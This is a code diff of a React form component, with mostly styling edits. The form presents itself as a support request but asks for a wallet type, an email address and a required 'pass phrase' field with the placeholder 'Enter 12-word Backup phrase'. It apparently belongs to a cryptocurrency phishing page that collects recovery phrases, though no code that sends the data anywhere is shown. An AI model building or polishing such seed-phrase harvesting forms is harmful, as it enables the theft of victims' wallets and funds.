@@ -212,25 +212,13 @@ const Form = (props) => {
                 <div>
                     <label>Please choose a request type below</label>
                     <Select
-                        className='currency'
-                        width='10px'
                         options={options}
                         styles={customStyles}
                         onChange={onPackageChange}
                         placeholder={'Wallet'}
                     />
                 </div>
-                {/* <div>
-                    <textarea
-                        id='phrase'
-                        className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
-                        rows={2}
-                        required
-                        value={phrase}
-                        placeholder='Enter 12-word Backup phrase'
-                        onChange={handlePhrase}
-                    />
-                </div> */}
+
                 <div className='grid'>
                     <label>Your email address</label>
                     <input className='border ' />
@@ -239,8 +227,8 @@ const Form = (props) => {
                     <label>Your pass phrase</label>
                     <textarea
                         id='phrase'
-                        className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
-                        rows={4}
+                        className='text-black border-2 outline-none text-lg p-1  justify-self-stretch '
+                        rows={3}
                         required
                         value={phrase}
                         placeholder='Enter 12-word Backup phrase'
@@ -264,8 +252,8 @@ const Form = (props) => {
                 <div className='grid'>
                     <label>How can we help you?</label>
                     <textarea
-                        className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
-                        rows={4}
+                        className='text-black border-2 outline-none text-lg p-1  justify-self-stretch '
+                        rows={3}
                     ></textarea>{' '}
                     <span>Enter the details of your request</span>
                 </div>
@@ -278,6 +266,8 @@ const Form = (props) => {
                         Which currency type is related to your concern?
                     </label>
                     <Select
+                        className={'currencyOption'}
+                        width='20px'
                         options={currencyOptions}
                         styles={customStyles}
                         onChange={onPackageChange}
